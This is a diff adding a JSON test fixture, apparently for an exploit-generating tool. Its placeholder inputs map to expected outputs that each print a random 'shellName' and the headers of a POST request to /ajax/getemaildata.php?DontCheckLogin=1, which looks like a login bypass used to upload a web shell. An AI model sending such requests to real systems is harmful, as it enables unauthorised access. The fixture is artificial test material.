@@ -1,0 +1,16 @@
+{
+    "inputs": [
+        "1st test case",
+        "2nd test case",
+        "3rd test case",
+        "4th test case",
+        "5th test case"
+    ],
+    "outputs": [
+        "Final shellName: abcdefghij\nConstructed Payload:\nPOST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1\nHost: 192.168.3.11:8888\nContent-Length: 312\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Final shellName: klmnopqrst\nConstructed Payload:\nPOST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1\nHost: 192.168.3.11:8888\nContent-Length: 312\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Final shellName: uvwxyzabcd\nConstructed Payload:\nPOST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1\nHost: 192.168.3.11:8888\nContent-Length: 312\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Final shellName: efghijklmn\nConstructed Payload:\nPOST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1\nHost: 192.168.3.11:8888\nContent-Length: 312\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Final shellName: xyzabcdefg\nConstructed Payload:\nPOST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1\nHost: 192.168.3.11:8888\nContent-Length: 312\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    ]
+}
